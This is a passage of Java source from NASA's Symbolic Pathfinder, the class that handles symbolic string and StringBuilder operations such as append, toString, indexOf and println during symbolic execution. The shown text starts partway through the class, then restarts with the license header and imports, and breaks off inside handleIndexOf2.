				sym_v2._append(val);
				sf.push(s2, true); /* symbolic string Builder element */
			} else if (sym_v2.getstr() == null) { // operand 1 is concrete; get string
				// from String builder object
				ElementInfo e1 = th.getElementInfo(s2);
				String val = getStringEquiv(e1);
				sym_v2.putstr(new StringConstant(val));
				sym_v2._append(sym_v1);
				sf.push(s2, true); /* symbolic string Builder element */
			} else { // both operands are symbolic
				sym_v2._append(sym_v1);
				sf.push(s2, true); /* string Builder element can continue */
			}

			sf.setOperandAttr(sym_v2);
		}
	}

	public void handleShortAppend(JVMInvokeInstruction invInst, ThreadInfo th) {

		StackFrame sf = th.getModifiableTopFrame();
		IntegerExpression sym_v1 = (IntegerExpression) sf.getOperandAttr(0);
		SymbolicStringBuilder sym_v2 = (SymbolicStringBuilder) sf.getOperandAttr(1);

		if (sym_v2 == null)
			sym_v2 = new SymbolicStringBuilder();
		if ((sym_v1 == null) & (sym_v2.getstr() == null)) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: handleShortAppend"");
		} else {
			short s1 = (short) sf.pop();
			int s2 = sf.pop();
			if (sym_v1 == null) { // operand 0 is concrete
				String val = Short.toString(s1);
				sym_v2._append(val);
				sf.push(s2, true); /* symbolic string Builder element */
			} else if (sym_v2.getstr() == null) { // operand 1 is concrete; get string
				// from String builder object
				ElementInfo e1 = th.getElementInfo(s2);
				String val = getStringEquiv(e1);
				sym_v2.putstr(new StringConstant(val));
				sym_v2._append(sym_v1);
				sf.push(s2, true); /* symbolic string Builder element */
			} else { // both operands are symbolic
				sym_v2._append(sym_v1);
				sf.push(s2, true); /* string Builder element can continue */
			}

			sf.setOperandAttr(sym_v2);
		}
	}

	public void handleIntAppend(JVMInvokeInstruction invInst, ThreadInfo th) {

		StackFrame sf = th.getModifiableTopFrame();
		IntegerExpression sym_v1 = (IntegerExpression) sf.getOperandAttr(0);
		SymbolicStringBuilder sym_v2 = (SymbolicStringBuilder) sf.getOperandAttr(1);

		if (sym_v2 == null)
			sym_v2 = new SymbolicStringBuilder();
		if ((sym_v1 == null) & (sym_v2.getstr() == null)) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: hanldeIntAppend"");
		} else {
			int s1 = sf.pop();
			int s2 = sf.pop();
			if (sym_v1 == null) { // operand 0 is concrete
				String val = Integer.toString(s1);
				sym_v2._append(val);
				sf.push(s2, true); /* symbolic string Builder element */
			} else if (sym_v2.getstr() == null) { // operand 1 is concrete; get string
				// from String builder object
				ElementInfo e1 = th.getElementInfo(s2);
				String val = getStringEquiv(e1);
				sym_v2.putstr(new StringConstant(val));
				sym_v2._append(sym_v1);
				sf.push(s2, true); /* symbolic string Builder element */
			} else { // both operands are symbolic
				sym_v2._append(sym_v1);
				sf.push(s2, true); /* string Builder element can continue */
			}

			sf.setOperandAttr(sym_v2);
		}
	}

	public void handleFloatAppend(JVMInvokeInstruction invInst, ThreadInfo th) {

		StackFrame sf = th.getModifiableTopFrame();
		RealExpression sym_v1 = (RealExpression) sf.getOperandAttr(0);
		SymbolicStringBuilder sym_v2 = (SymbolicStringBuilder) sf.getOperandAttr(1);

		if (sym_v2 == null)
			sym_v2 = new SymbolicStringBuilder();
		if ((sym_v1 == null) & (sym_v2.getstr() == null)) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: hanldeFloatAppend"");
		} else {
			float s1 = Types.intToFloat(sf.pop());
			int s2 = sf.pop();
			if (sym_v1 == null) { // operand 0 is concrete
				String val = Float.toString(s1);
				sym_v2._append(val);
				sf.push(s2, true); /* symbolic string Builder element */
			} else if (sym_v2.getstr() == null) { // operand 1 is concrete; get string
				// from String builder object
				ElementInfo e1 = th.getElementInfo(s2);
				String val = getStringEquiv(e1);
				sym_v2.putstr(new StringConstant(val));
				sym_v2._append(sym_v1);
				sf.push(s2, true); /* symbolic string Builder element */
			} else { // both operands are symbolic
				sym_v2._append(sym_v1);
				sf.push(s2, true); /* string Builder element can continue */
			}

			sf.setOperandAttr(sym_v2);
		}
	}

	public void handleBooleanAppend(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		IntegerExpression sym_v1 = (IntegerExpression) sf.getOperandAttr(0);
		SymbolicStringBuilder sym_v2 = (SymbolicStringBuilder) sf.getOperandAttr(1);

		if (sym_v2 == null)
			sym_v2 = new SymbolicStringBuilder();
		if ((sym_v1 == null) & (sym_v2.getstr() == null)) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: hanldeBooleanAppend"");
		} else {
			boolean s1 = Types.intToBoolean(sf.pop());
			int s2 = sf.pop();
			if (sym_v1 == null) { // operand 0 is concrete
				String val = Boolean.toString(s1);
				sym_v2._append(val);
				sf.push(s2, true); /* symbolic string Builder element */
			} else if (sym_v2.getstr() == null) { // operand 1 is concrete; get string
				// from String builder object
				ElementInfo e1 = th.getElementInfo(s2);
				String val = getStringEquiv(e1);
				sym_v2.putstr(new StringConstant(val));
				sym_v2._append(sym_v1); /*
																 * String s1 =
																 * AbstractionUtilityMethods.unknownString();
																 * String s2 =
																 * AbstractionUtilityMethods.unknownString();
																 * String s4 =
																 * AbstractionUtilityMethods.unknownString();
																 * String s5 =
																 * AbstractionUtilityMethods.unknownString();
																 */

				sf.push(s2, true); /* symbolic string Builder element */
			} else { // both operands are symbolic
				sym_v2._append(sym_v1);
				sf.push(s2, true); /* string Builder element can continue */
			}

			sf.setOperandAttr(sym_v2);
		}
	}

	public void handleLongAppend(JVMInvokeInstruction invInst, ThreadInfo th) {

		StackFrame sf = th.getModifiableTopFrame();
		IntegerExpression sym_v1 = (IntegerExpression) sf.getOperandAttr(0);
		SymbolicStringBuilder sym_v2 = (SymbolicStringBuilder) sf.getOperandAttr(2);

		if (sym_v2 == null)
			sym_v2 = new SymbolicStringBuilder();
		if ((sym_v1 == null) & (sym_v2.getstr() == null)) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: handleLongAppend"");
		} else {
			long s1 = sf.popLong();
			int s2 = sf.pop();
			if (sym_v1 == null) { // operand 0 is concrete
				String val = Long.toString(s1);
				sym_v2._append(val);
				sf.push(s2, true); /* symbolic string Builder element */
			} else if (sym_v2.getstr() == null) { // operand 1 is concrete; get string
				// from String builder object
				ElementInfo e1 = th.getElementInfo(s2);
				String val = getStringEquiv(e1);
				sym_v2.putstr(new StringConstant(val));
				sym_v2._append(sym_v1);
				sf.push(s2, true); /* symbolic string Builder element */
			} else { // both operands are symbolic
				sym_v2._append(sym_v1);
				sf.push(s2, true); /* string Builder element can continue */
			}

			sf.setOperandAttr(sym_v2);
		}
	}

	public void handleDoubleAppend(JVMInvokeInstruction invInst, ThreadInfo th) {

		StackFrame sf = th.getModifiableTopFrame();

		RealExpression sym_v1 = (RealExpression) sf.getLongOperandAttr();
		double s1 = Types.longToDouble(sf.popLong());
		SymbolicStringBuilder sym_v2 = (SymbolicStringBuilder) sf.getOperandAttr();
		int s2 = sf.pop();

		if (sym_v2 == null)
			sym_v2 = new SymbolicStringBuilder();
		if ((sym_v1 == null) & (sym_v2.getstr() == null)) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand"");
		} else {

			if (sym_v1 == null) { // operand 0 is concrete
				String val = Double.toString(s1);
				sym_v2._append(val);
				sf.push(s2, true); /* symbolic string Builder element */
			} else if (sym_v2.getstr() == null) { // operand 1 is concrete; get string
				// from String builder object
				ElementInfo e1 = th.getElementInfo(s2);
				String val = getStringEquiv(e1);
				sym_v2.putstr(new StringConstant(val));
				sym_v2._append(sym_v1);
				sf.push(s2, true); /* symbolic string Builder element */
			} else { // both operands are symbolic
				sym_v2._append(sym_v1);
				sf.push(s2, true); /* string Builder element can continue */
			}

			sf.setOperandAttr(sym_v2);
		}
	}

	/*
	 * String s1 = AbstractionUtilityMethods.unknownString(); String s2 =
	 * AbstractionUtilityMethods.unknownString(); String s4 =
	 * AbstractionUtilityMethods.unknownString(); String s5 =
	 * AbstractionUtilityMethods.unknownString();
	 */

	public void handleObjectAppend(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();

		Expression sym_v1 = (Expression) sf.getOperandAttr(0);
		SymbolicStringBuilder sym_v2 = (SymbolicStringBuilder) sf.getOperandAttr(1);
		// System.out.println(invInst.getSourceLocation());
		if (sym_v2 == null)
			sym_v2 = new SymbolicStringBuilder();
		if ((sym_v1 == null) && (sym_v2.getstr() == null)) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: handleObjectAppend"");
		} else {
			int s1 = sf.pop();
			ElementInfo e2 = th.getElementInfo(s1);
			int s2 = sf.pop();
			if (sym_v1 == null || (sym_v1 instanceof SymbolicStringBuilder 
					&& ((SymbolicStringBuilder) sym_v1).getstr() == null)) { // operand 0 is concrete
				String val = getStringEquiv(e2);
				sym_v2._append(val);
				sf.push(s2, true); /* symbolic string Builder element */
			} else if (sym_v2.getstr() == null) { // operand 1 is concrete; get string
				// from String builder object
				ElementInfo e1 = th.getElementInfo(s2);
				String val = getStringEquiv(e1);
				sym_v2.putstr(new StringConstant(val));
				if (sym_v1 instanceof SymbolicStringBuilder)
					sym_v2._append((SymbolicStringBuilder) sym_v1);
				else if (sym_v1 instanceof StringExpression)
					sym_v2._append((StringExpression) sym_v1);
				else {
					throw new RuntimeException(""Object not handled in ObjectAppend"");
				}
				// setVariableAttribute(ei, invInst, th, sf, s2, sym_v2); //set the
				// value of the attribute of local StringBuilder element as sym_v2
				sf.push(s2, true); /* symbolic string Builder element */
			} else { // both operands are symbolic
				if (sym_v1 instanceof SymbolicStringBuilder)
					sym_v2._append((SymbolicStringBuilder) sym_v1);
				else if (sym_v1 instanceof StringExpression)
					sym_v2._append((StringExpression) sym_v1);
				else {
					throw new RuntimeException(""Object not handled in ObjectAppend"");
				}

				sf.push(s2, true); /* string Builder element can continue */
			}
			sf.setOperandAttr(sym_v2);
		}
	}

	public void handleStringBuilderAppend(JVMInvokeInstruction invInst, ThreadInfo th) {

		StackFrame sf = th.getModifiableTopFrame();
		SymbolicStringBuilder sym_v1 = (SymbolicStringBuilder) sf.getOperandAttr(0);
		SymbolicStringBuilder sym_v2 = (SymbolicStringBuilder) sf.getOperandAttr(1);

		if (sym_v2 == null)
			sym_v2 = new SymbolicStringBuilder();
		if (sym_v1 == null)
			sym_v1 = new SymbolicStringBuilder();

		if ((sym_v1.getstr() == null) & (sym_v2.getstr() == null)) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: hanldeStringBuilderAppend"");
		} else {
			int s1 = sf.pop();
			int s2 = sf.pop();

			if (sym_v1.getstr() == null) { // operand 0 is concrete
				ElementInfo e1 = th.getElementInfo(s1);
				String val = getStringEquiv(e1);
				sym_v2._append(val);
				sf.push(s2, true); /* symbolic string Builder element */
			} else if (sym_v2.getstr() == null) { // operand 1 is concrete; get string
				// from String builder object
				ElementInfo e1 = th.getElementInfo(s2);
				String val = getStringEquiv(e1);
				sym_v2.putstr(new StringConstant(val));
				sym_v2._append(sym_v1);
				sf.push(s2, true); /* symbolic string Builder element */
			} else { // both operands are symbolic
				sym_v2._append(sym_v1);
				sf.push(s2, true); /* string Builder element can continue */
			}

			sf.setOperandAttr(sym_v2);
		}
	}

	public String getStringEquiv(ElementInfo ei) {
		String objectType = ei.getType();
		if (objectType.equals(""Ljava/lang/StringBuilder;"")) {
			int idx = ei.getReferenceField(""value"");
			int length = ei.getIntField(""count"");
			ElementInfo e1 = VM.getVM().getHeap().get(idx);
			char[] str = e1.asCharArray();
			String val = new String(str, 0, length);
			return val;
		} else if (objectType.equals(""Ljava/lang/StringBuffer;"")) {
			int idx = ei.getReferenceField(""value"");
			int length = ei.getIntField(""count"");
			ElementInfo e1 = VM.getVM().getHeap().get(idx);
			char[] str = e1.asCharArray();
			String val = new String(str, 0, length);
			return val;
		} else if (objectType.equals(""Ljava/lang/Integer;"")) {
			int val = ei.getIntField(""value"");
			return Integer.toString(val);
		} else if (objectType.equals(""Ljava/lang/Float;"")) {
			float val = ei.getFloatField(""value"");
			return Float.toString(val);
		} else if (objectType.equals(""Ljava/lang/Long;"")) {
			long val = ei.getLongField(""value"");
			return Long.toString(val);
		} else if (objectType.equals(""Ljava/lang/Double;"")) {
			double val = ei.getDoubleField(""value"");
			return Double.toString(val);
		} else if (objectType.equals(""Ljava/lang/Boolean;"")) {
			boolean val = ei.getBooleanField(""value"");
			return Boolean.toString(val);
		} else {
			throw new RuntimeException(""ERROR: Object Type Not Handled in getStringVal"");
		}
	}

	public Instruction handletoString(JVMInvokeInstruction invInst,  ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		Object sym_obj_v2 = sf.getOperandAttr(0);
		if (sym_obj_v2 instanceof StringExpression) {
			return null;
		}
		StringExpression sym_v1 = null;
		if (sym_obj_v2 instanceof SymbolicStringBuilder) {
			SymbolicStringBuilder sym_v2 = (SymbolicStringBuilder) sym_obj_v2;
			sym_v1 = sym_v2.getstr();
		} else {
			throw new RuntimeException(""ERROR: symbolic type not Handled: toString"");
		}

		if ((sym_v1 == null)) {
			throw new RuntimeException(""ERROR: symbolic string method must have symbolic operand: toString"");
		} else {
			sf.pop();
			ElementInfo ei = th.getHeap().newString("""", th);
			int objRef = ei.getObjectRef();
			sf.push(objRef, true);
			sf.setOperandAttr(sym_v1);
		}
		return null;
	}

	public void handleprintln(JVMInvokeInstruction invInst, ThreadInfo th, boolean doPrintln) {
		StackFrame sf = th.getModifiableTopFrame();
		MethodInfo mi = invInst.getInvokedMethod(th);
		String[] argTypes = mi.getArgumentTypeNames();
		Expression sym_v1 = null;
		boolean flag = false;
		if ((argTypes[0].equals(""long"")) || (argTypes[0].equals(""double""))) {
			sym_v1 = (Expression) sf.getLongOperandAttr();
			flag = true;
		} else {
			sym_v1 = (Expression) sf.getOperandAttr(0);
		}

		if ((sym_v1 == null)) {
			throw new RuntimeException(""ERROR: symbolic string method must have symbolic operand: println"");
		} else {
			if (flag)
				sf.popLong();
			else
				sf.pop(); // clear out operand stack
			sf.pop();
			String result = sym_v1.toString();
			if (doPrintln) {
				System.out.println(""Symbolic Exp [ "" + result + ""]"");
			} else {
				System.out.print(""Symbolic Exp [ "" + result + "" ]"");
			}
			th.getHeap().newString("""", th); //Corina this code is so broken
			//th.push(objRef, true);
			//sf.setOperandAttr(sym_v1);
		}
	}
}/*
 * Copyright (C) 2014, United States Government, as represented by the
 * Administrator of the National Aeronautics and Space Administration.
 * All rights reserved.
 *
 * Symbolic Pathfinder (jpf-symbc) is licensed under the Apache License, 
 * Version 2.0 (the ""License""); you may not use this file except
 * in compliance with the License. You may obtain a copy of the License at
 * 
 *        http://www.apache.org/licenses/LICENSE-2.0. 
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an ""AS IS"" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and 
 * limitations under the License.
 */

/*  Copyright (C) 2005 United States Government as represented by the
Administrator of the National Aeronautics and Space Administration
(NASA).  All Rights Reserved.

Copyright (C) 2009 Fujitsu Laboratories of America, Inc.

DISCLAIMER OF WARRANTIES AND LIABILITIES; WAIVER AND INDEMNIFICATION

A. No Warranty: THE SUBJECT SOFTWARE IS PROVIDED ""AS IS"" WITHOUT ANY
WARRANTY OF ANY KIND, EITHER EXPRESSED, IMPLIED, OR STATUTORY,
INCLUDING, BUT NOT LIMITED TO, ANY WARRANTY THAT THE SUBJECT SOFTWARE
WILL CONFORM TO SPECIFICATIONS, ANY IMPLIED WARRANTIES OF
MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE, OR FREEDOM FROM
INFRINGEMENT, ANY WARRANTY THAT THE SUBJECT SOFTWARE WILL BE ERROR
FREE, OR ANY WARRANTY THAT DOCUMENTATION, IF PROVIDED, WILL CONFORM TO
THE SUBJECT SOFTWARE. NO SUPPORT IS WARRANTED TO BE PROVIDED AS IT IS PROVIDED ""AS-IS"".

B. Waiver and Indemnity: RECIPIENT AGREES TO WAIVE ANY AND ALL CLAIMS
AGAINST FUJITSU LABORATORIES OF AMERICA AND ANY OF ITS AFFILIATES, THE
UNITED STATES GOVERNMENT, ITS CONTRACTORS AND SUBCONTRACTORS, AS WELL
AS ANY PRIOR RECIPIENT.  IF RECIPIENT'S USE OF THE SUBJECT SOFTWARE
RESULTS IN ANY LIABILITIES, DEMANDS, DAMAGES, EXPENSES OR LOSSES ARISING
FROM SUCH USE, INCLUDING ANY DAMAGES FROM PRODUCTS BASED ON, OR RESULTING
FROM, RECIPIENT'S USE OF THE SUBJECT SOFTWARE, RECIPIENT SHALL INDEMNIFY
AND HOLD HARMLESS FUJITSU LABORATORTIES OF AMERICA AND ANY OF ITS AFFILIATES,
THE UNITED STATES GOVERNMENT, ITS CONTRACTORS AND SUBCONTRACTORS, AS WELL
AS ANY PRIOR RECIPIENT, TO THE EXTENT PERMITTED BY LAW.  RECIPIENT'S SOLE
REMEDY FOR ANY SUCH MATTER SHALL BE THE IMMEDIATE, UNILATERAL
TERMINATION OF THIS AGREEMENT. */



package gov.nasa.jpf.symbc.bytecode;



import gov.nasa.jpf.symbc.numeric.*;
import gov.nasa.jpf.vm.ChoiceGenerator;
import gov.nasa.jpf.vm.ClassInfo;
import gov.nasa.jpf.vm.ClassLoaderInfo;
import gov.nasa.jpf.vm.ElementInfo;
import gov.nasa.jpf.vm.FieldInfo;
import gov.nasa.jpf.vm.Instruction;
import gov.nasa.jpf.vm.MethodInfo;
import gov.nasa.jpf.vm.SystemState;
import gov.nasa.jpf.vm.Types;
import gov.nasa.jpf.vm.VM;
import gov.nasa.jpf.vm.StackFrame;
import gov.nasa.jpf.vm.ThreadInfo;
import gov.nasa.jpf.jvm.bytecode.JVMInvokeInstruction;
import gov.nasa.jpf.symbc.mixednumstrg.SpecialRealExpression;
import gov.nasa.jpf.symbc.string.*;
import gov.nasa.jpf.symbc.mixednumstrg.*;


public class SymbolicStringHandler {
	static int handlerStep = 0;
	static Instruction handlerStepSavedNext = null;
	static Object handlerStepSavedValue = null;

	public static final int intValueOffset = 5;

	/* this method checks if a method has as argument any symbolic strings */
	
	public boolean isMethodStringSymbolic(JVMInvokeInstruction invInst, ThreadInfo th) {
		String cname = invInst.getInvokedMethodClassName();

		if (cname.equals(""java.lang.String"")
				|| cname.equals(""java.lang.StringBuilder"")
				|| cname.equals(""java.lang.StringBuffer"")
				|| cname.equals(""java.lang.CharSequence"")
				|| cname.equals(""java.lang.Appendable"")
				|| cname.equals(""java.io.PrintStream"")
				|| cname.equals(""java.lang.Integer"")
				|| cname.equals(""java.lang.Float"")
				|| cname.equals(""java.lang.Double"")
				|| cname.equals(""java.lang.Long"")
				|| cname.equals(""java.lang.Short"")
				|| cname.equals(""java.lang.Byte"")
				|| cname.equals(""java.lang.Char"")
				|| cname.equals(""java.lang.Boolean"")
				|| cname.equals(""java.lang.Object"")) {
	        
			StackFrame sf = th.getModifiableTopFrame();

			int numStackSlots = invInst.getArgSize();

			for (int i = 0; i < numStackSlots; i++) {
				Expression sym_v1 = (Expression) sf.getOperandAttr(i);
				if (sym_v1 != null) {
					if (sym_v1 instanceof SymbolicStringBuilder) { // check if
						// StringBuilder has
						// empty attribute
						if (((SymbolicStringBuilder) sym_v1).getstr() != null) {
							return true;
						}
					} else if (sym_v1 instanceof IntegerExpression && cname.equals(""java.lang.StringBuilder"")){
						//to revise
						return true;
					} else {
						return true;
					}
					
				}
			}
			return false;
		}	
		else return false;
	}

	public Instruction handleSymbolicStrings(JVMInvokeInstruction invInst, ThreadInfo th) {

		boolean needToHandle = isMethodStringSymbolic(invInst, th);

		if (needToHandle) {
			// do the string manipulations
			String mname = invInst.getInvokedMethodName();
			String shortName = mname.substring(0, mname.indexOf(""(""));
			if (shortName.equals(""concat"")) {
				Instruction handled = handleConcat(invInst, th);
				if (handled != null) {
					return handled;
				}
			} else if (shortName.equals(""equals"")) {
				ChoiceGenerator<?> cg;
				if (!th.isFirstStepInsn()) { // first time around
					cg = new PCChoiceGenerator(2);
					th.getVM().setNextChoiceGenerator(cg);
					return invInst;
				} else {
					handleObjectEquals(invInst, th);
					return invInst.getNext(th);
				}
			} else if (shortName.equals(""equalsIgnoreCase"")) {
				ChoiceGenerator<?> cg;
				if (!th.isFirstStepInsn()) { // first time around
					cg = new PCChoiceGenerator(2);
					th.getVM().setNextChoiceGenerator(cg);
					return invInst;
				} else {
					handleEqualsIgnoreCase(invInst,  th);
					return invInst.getNext(th);
				}
			} else if (shortName.equals(""endsWith"")) {
				ChoiceGenerator<?> cg;
				if (!th.isFirstStepInsn()) { // first time around
					cg = new PCChoiceGenerator(2);
					th.getVM().setNextChoiceGenerator(cg);
					return invInst;
				} else {
					handleEndsWith(invInst, th);
					return invInst.getNext(th);
				}
			} else if (shortName.equals(""startsWith"")) {
				ChoiceGenerator<?> cg;
				if (!th.isFirstStepInsn()) { // first time around
					cg = new PCChoiceGenerator(2);
					th.getVM().setNextChoiceGenerator(cg);
					return invInst;
				} else {
					handleStartsWith(invInst, th);
					return invInst.getNext(th);
				}
			} else if (shortName.equals (""contains"")) {
				ChoiceGenerator<?> cg;
				if (!th.isFirstStepInsn()) { // first time around
					cg = new PCChoiceGenerator(2);
					th.getVM().setNextChoiceGenerator(cg);
					return invInst;
				} else {
					handleContains(invInst, th);
					return invInst.getNext(th);
				}
			} else if (shortName.equals(""append"")) {
				Instruction handled = handleAppend(invInst, th);
				if (handled != null) {
					return handled;
				}
			} else if (shortName.equals(""length"")) {
				handleLength(invInst, th);
			} else if (shortName.equals(""indexOf"")) {
				handleIndexOf(invInst, th);
			} else if (shortName.equals(""lastIndexOf"")) {
				handleLastIndexOf(invInst, th);
			} else if (shortName.equals(""charAt"")) {
				handleCharAt (invInst, th); // returns boolean that is ignored
				//return invInst;
			} else if (shortName.equals(""replace"")) {
				Instruction handled = handleReplace(invInst, th);
				if (handled != null) {
					return handled;
				}
			} else if (shortName.equals(""replaceFirst"")) {
				Instruction handled = handleReplaceFirst(invInst, th);
				if (handled != null) {
					return handled;
				}
			} else if (shortName.equals(""trim"")) {
				handleTrim(invInst, th);
			} else if (shortName.equals(""substring"")) {
				Instruction handled = handleSubString(invInst, th);
				if (handled != null) {
					return handled;
				}
			} else if (shortName.equals(""valueOf"")) {
				Instruction handled = handleValueOf(invInst, th);
				if (handled != null) {
					return handled;
				}
			} else if (shortName.equals(""parseInt"")) {
				ChoiceGenerator<?> cg;
				if (!th.isFirstStepInsn()) { // first time around
					cg = new PCChoiceGenerator(2);
					th.getVM().setNextChoiceGenerator(cg);
					return invInst;
				} else {
					handleParseInt(invInst, th);
					return invInst.getNext(th);
				}
			} else if (shortName.equals(""parseFloat"")) {
				ChoiceGenerator<?> cg;
				if (!th.isFirstStepInsn()) { // first time around
					cg = new PCChoiceGenerator(2);
					th.getVM().setNextChoiceGenerator(cg);
					return invInst;
				} else {
					handleParseFloat(invInst, th);
					return invInst.getNext(th);
				}
			} else if (shortName.equals(""parseLong"")) {
				ChoiceGenerator<?> cg;
				if (!th.isFirstStepInsn()) { // first time around
					cg = new PCChoiceGenerator(2);
					th.getVM().setNextChoiceGenerator(cg);
					return invInst;
				} else {
					handleParseLong(invInst, th);
					return invInst.getNext(th);
				}
			} else if (shortName.equals(""parseDouble"")) {
				ChoiceGenerator<?> cg;
				if (!th.isFirstStepInsn()) { // first time around
					cg = new PCChoiceGenerator(2);
					th.getVM().setNextChoiceGenerator(cg);
					return invInst;
				} else {
					handleParseDouble(invInst, th);
					return invInst.getNext(th);
				}
			} else if (shortName.equals(""parseBoolean"")) {
				ChoiceGenerator<?> cg;
				if (!th.isFirstStepInsn()) { // first time around
					cg = new PCChoiceGenerator(2);
					th.getVM().setNextChoiceGenerator(cg);
					return invInst;
				} else {
					handleParseBoolean(invInst, th);
					return invInst.getNext(th);
				}
			} else if (shortName.equals(""toString"")) {
				Instruction handled = handletoString(invInst, th);
				if (handled != null) {
					return handled;
				}
			} else if (shortName.equals(""println"")) {
				handleprintln(invInst, th, true);
			} else if (shortName.equals(""print"")) {
				handleprintln(invInst, th, false);
			} else if (shortName.equals(""<init>"")) {
				Instruction handled = handleInit(invInst, th);
				if (handled != null) {
					return handled;
				} else {
					return null;
				}
			} else if (shortName.equals(""intValue"")) {
				handleintValue(invInst, th);
			} else if (shortName.equals(""floatValue"")) {
				handlefloatValue(invInst, th);
			} else if (shortName.equals(""longValue"")) {
				handlelongValue(invInst, th);
			} else if (shortName.equals(""doubleValue"")) {
				handledoubleValue(invInst, th);
			} else if (shortName.equals(""booleanValue"")) {
				handlefloatValue(invInst, th);
			} else if (shortName.equals(""isEmpty"")) {
				ChoiceGenerator<?> cg;
				if (!th.isFirstStepInsn()){
					cg = new PCChoiceGenerator(2);
					th.getVM().setNextChoiceGenerator(cg);
					return invInst;
				} else {
					handleIsEmpty(invInst, th);
					return invInst.getNext(th);
				}
			}else {
				throw new RuntimeException(""ERROR: symbolic method not handled: "" + shortName);
				//return null;
			}
			return invInst.getNext(th);
		} else {
			return null;
		}

	}

	private boolean handleCharAt (JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		IntegerExpression sym_v1 = (IntegerExpression) sf.getOperandAttr(0);
		StringExpression sym_v2 = (StringExpression) sf.getOperandAttr(1);
		boolean bresult = false;
		if ((sym_v1 == null) & (sym_v2 == null)) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: HandleCharAt"");
		} else {
			int s1 = sf.pop();
			int s2 = sf.pop();

			IntegerExpression result = null;
			if (sym_v1 == null) { // operand 0 is concrete

				int val = s1;
				result = sym_v2._charAt(new IntegerConstant(val));
			} else {

				if (sym_v2 == null) {
					ElementInfo e1 = th.getElementInfo(s2);
					String val2 = e1.asString();
					sym_v2 = new StringConstant(val2);
					result = sym_v2._charAt(sym_v1);
				} else {
					result = sym_v2._charAt(sym_v1);
				}
				bresult = true;
				//System.out.println(""[handleCharAt] Ignoring: "" + result.toString());
				//th.push(0, false);
			}
			sf.push(0, false);
			sf.setOperandAttr(result);
		}
		return bresult; // not used

	}

	public void handleLength(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		StringExpression sym_v1 = (StringExpression) sf.getOperandAttr(0);
		if (sym_v1 == null) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: HandleLength"");
		} else {
			sf.pop();
			sf.push(0, false); /* dont care value for length */
			IntegerExpression sym_v2 = sym_v1._length();
			sf.setOperandAttr(sym_v2);
		}

	}

	public void handleIndexOf(JVMInvokeInstruction invInst, ThreadInfo th) {
		int numStackSlots = invInst.getArgSize();
		if (numStackSlots == 2) {
			handleIndexOf1(invInst, th);
		} else {
			handleIndexOf2(invInst, th);
		}

	}

	/* two possibilities int, or String in parameter */
	public void handleIndexOf1(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		
		//boolean castException = false;
		StringExpression sym_v1 = null;
		Expression sym_v2 = null; // could be String or Char
		sym_v1 = (StringExpression)sf.getOperandAttr(1);
		sym_v2 = (Expression) sf.getOperandAttr(0);
		if (sym_v1 == null && sym_v2 == null) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: HandleIndexOf1"");
		} else {
			boolean s2char = true; //argument is char
			if (sf.isOperandRef()) {
				s2char = false; //argument is string
			}
			
			int s1 = sf.pop();
			int s2 = sf.pop();

			IntegerExpression result = null;
			if (sym_v1 != null) {
					if (sym_v2 != null) { // both are symbolic values
						if (s2char) 
							result = sym_v1._indexOf((IntegerExpression)sym_v2);
						else
							result = sym_v1._indexOf((StringExpression)sym_v2);
					} else { // sym_v2 is null
						if (s2char) {
							result = sym_v1._indexOf(new IntegerConstant(s2));
						}
						else {
							ElementInfo e2 = th.getElementInfo(s2);
							String val = e2.asString();
							result = sym_v1._indexOf(new StringConstant(val));
						}
					}
			} else { // sym_v1 is null, sym_v2 must be not null
				    assert(sym_v2!=null);
					ElementInfo e1 = th.getElementInfo(s2);
					String val = e1.asString();
                    if (s2char) 
						result = new StringConstant(val)._indexOf((IntegerExpression)sym_v2);
					else
						result = new StringConstant(val)._indexOf((StringExpression)sym_v2);
			}
			sf.push(0, false);
			assert result != null;
			sf.setOperandAttr(result);


		}
	}

	/* two possibilities int, int or int, String in parameters */
	public void handleIndexOf2(JVMInvokeInstruction invInst, ThreadInfo th) {

		StackFrame sf = th.getModifiableTopFrame();

		StringExpression sym_v1 = null;
		Expression sym_v2 = null;
		IntegerExpression intExp = null;
		sym_v1 = (StringExpression) sf.getOperandAttr(2);
		intExp = (IntegerExpression) sf.getOperandAttr(0);
		sym_v2 = (Expression) sf.getOperandAttr(1);

		if (sym_v1 == null && sym_v2 == null && intExp == null) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: HandleIndexOf2"");
		} else {

			int i1 = sf.pop();
			boolean s2char = true;
			if (sf.isOperandRef()) {
				//System.out.println(""[handleIndexOf2] string detected"");
				s2char = false;
			}
			
			int s2 = sf.pop();
			int s1 = sf.pop();

			IntegerExpression result = null;
			if (intExp != null) {
				if (sym_v1 != null) {
					if (sym_v2 != null) { // both are symbolic values
						if (s2char)
							result = sym_v1._indexOf((IntegerExpression)sym_v2, intExp);
						else
							result = sym_v1._indexOf((StringExpression)sym_v2, intExp);
					} else { //sym_v2 is null
						if (s2char) {
							result = sym_v1._indexOf(new IntegerConstant(s2), intExp);
						}
						else {
							ElementInfo e2 = th.getElementInfo(s2);
							String val = e2.asString();
							result = sym_v1._indexOf(new StringConstant(val), intExp);
						}
					}
				} else { // sym_v1 is null
					ElementInfo e1 = th.getElementInfo(s1);
